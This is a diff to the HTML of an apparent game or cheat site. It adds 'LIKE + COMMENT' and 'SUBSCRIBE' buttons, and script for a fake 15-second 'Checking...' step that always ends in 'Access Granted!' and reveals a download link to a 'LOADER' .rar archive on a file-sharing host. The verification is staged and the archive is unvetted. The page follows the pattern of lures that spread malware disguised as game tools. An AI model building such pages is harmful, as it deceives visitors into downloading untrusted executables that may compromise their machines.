@@ -127,10 +127,28 @@
                                         </li>
                                     </ul>
                                 </div>
-                                <div class="fin-heading">
-                                    <h1 class="fin-heading glitch">
-                                        Actavis
-                                    </h1>
+                                <div class="fin-heading" style="text-align: center;">
+                                    <div class="action-buttons">
+                                        <p style="font-size: 18px; margin-bottom: 10px;">LIKE + COMMENT to support</p>
+                                        
+                                        <!-- COMMENT BUTTON -->
+                                        <button onclick="window.open('https://www.youtube.com/watch?v=qRwTmHofDQ4', '_blank')" style="padding: 10px 20px; font-size: 16px; cursor: pointer; margin-bottom: 10px;">
+                                            COMMENT ON VIDEO
+                                        </button>
+                                        <br>
+                                        
+                                        <!-- SUBSCRIBE BUTTON -->
+                                        <button id="subscribeBtn" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">
+                                            <img id="ytLogo" src="https://www.youtube.com/s/desktop/8a186710/img/favicon_144x144.png" alt="YouTube" width="24" style="vertical-align: middle; margin-right: 8px; transition: transform 1s linear;">
+                                            SUBSCRIBE
+                                        </button>
+                                
+                                        <p id="statusMessage" style="margin-top: 10px; font-size: 16px;"></p>
+                                
+                                        <div id="loaderLink" style="margin-top: 10px; display: none;">
+                                            <a href="https://files.catbox.moe/cyviun.rar" target="_blank">LOADER DOWNLOAD UNLOCKED</a>
+                                        </div>
+                                    </div>
                                 </div>
                                 <div class="fin-subheading">
                                     &middot; PLAY TO WIN &middot;
@@ -274,6 +292,34 @@
     <script src="assets/js/plugins.js" type="text/javascript"></script>
     <script src="assets/js/main.js" type="text/javascript"></script>
 
+
+
+<script>
+    const subscribeBtn = document.getElementById("subscribeBtn");
+    const statusMessage = document.getElementById("statusMessage");
+    const loaderLink = document.getElementById("loaderLink");
+    const ytLogo = document.getElementById("ytLogo");
+
+    subscribeBtn.addEventListener("click", () => {
+        ytLogo.style.animation = "spin 1s linear infinite";
+        statusMessage.textContent = "Checking...";
+        subscribeBtn.disabled = true;
+
+        setTimeout(() => {
+            ytLogo.style.animation = "none";
+            statusMessage.textContent = "Access Granted!";
+            loaderLink.style.display = "block";
+        }, 15000);
+    });
+</script>
+
+<style>
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
+    
     <!--END OF JS SCRIPTS INCLUDE -->
 
 </body>
